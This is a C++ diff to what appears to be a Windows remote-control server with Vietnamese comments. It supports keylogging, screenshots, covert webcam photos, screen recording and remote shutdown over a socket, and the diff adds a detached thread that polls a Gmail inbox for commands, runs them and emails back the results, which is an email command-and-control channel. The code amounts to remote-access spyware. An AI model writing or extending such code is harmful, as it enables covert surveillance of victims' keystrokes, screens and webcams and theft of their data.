@@ -179,6 +179,24 @@ void sendResponse(SOCKET sock, const std::string& msg)
     }
 }
 
+bool isValidCommand(const std::string& cmd)
+{
+    static const std::set<std::string> validCommands = {
+        "help", "list_services", "start ", "stop ", "list_apps",
+        "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
+        "restart", "shutdown", "start_record", "stop_record", "gmail_server"
+    };
+
+    for (const auto& validCmd : validCommands)
+    {
+        if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
+        {
+            return true;
+        }
+    }
+    return false;
+}
+
 void handleCommand(SOCKET sock, const std::string& cmd)
 {
     if (cmd == "help")
@@ -192,8 +210,8 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  list_apps               - List all visible applications\n"
             "  start_keylogger         - Start keylogger\n"
             "  stop_keylogger          - Stop keylogger\n"
-            "  screenshot <filename>   - Capture screen and save as PNG\n"
-            "  webcam_photo <filename> - Capture single webcam photo\n"
+            "  screenshot              - Capture screen and save as PNG\n"
+            "  webcam_photo            - Capture single webcam photo\n"
             "  restart                 - Restart the system\n"
             "  shutdown                - Shutdown the system\n"
             "  start_record            - Start screen recording\n"
@@ -245,19 +263,9 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string msg = "Keylogger stopped.";
         sendResponse(sock, msg);
     }
-    else if (cmd.rfind("screenshot ", 0) == 0)
+    else if (cmd == "screenshot")
     {
-        std::string filename = cmd.substr(11);
-        if (filename.empty())
-        {
-            filename = "screenshot.png";
-        }
-        // Thêm extension .png nếu chưa có
-        if (filename.find(".png") == std::string::npos && 
-            filename.find(".PNG") == std::string::npos)
-        {
-            filename += ".png";
-        }
+        std::string filename = "screenshot.png"; // Default filename
         
         bool success = captureScreen(filename);
         std::string msg = success ? 
@@ -297,20 +305,12 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         }
         // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
     }
-    else if (cmd.rfind("webcam_photo ", 0) == 0)
+    else if (cmd == "webcam_photo")
     {
-        std::string filename = cmd.substr(13);
-        if (filename.empty())
-        {
-            filename = "webcam_photo.jpg"; // Default filename
-        }
-
-        std::string startMsg = "Capturing webcam photo: " + filename + "...";
-        sendResponse(sock, startMsg);
-
+        std::string filename = "webcam_photo.jpg"; // Default filename
         bool success = captureWebcamPhoto(filename);
-        std::string msg = success ?
-            "Webcam photo captured successfully: " + filename :
+        std::string msg = success ? 
+            "Webcam photo captured successfully: " + filename : 
             "Failed to capture webcam photo.";
         sendResponse(sock, msg);
     }
@@ -382,6 +382,24 @@ int main()
         return 1;
     }
     std::cout << "Client connected." << std::endl;
+
+    // run local Gmail server in a separate thread
+    std::thread gmailThread([&clientSock]() {
+        while (true)
+        {
+            refreshAccessToken(); // Refresh access token periodically
+            std::string cmd = readLastEmailCommand(); // Read last command from email
+            if (!cmd.empty() && isValidCommand(cmd))
+            {
+                std::string response = executeCommand(cmd); // Execute command
+                sendEmail("Command Response", response); // Send response via email
+            }
+
+            Sleep(10000); // Check every 10 seconds
+        }
+    });
+
+    gmailThread.detach(); // Detach the thread to run independently
 
     char buffer[1024];
     while (true)
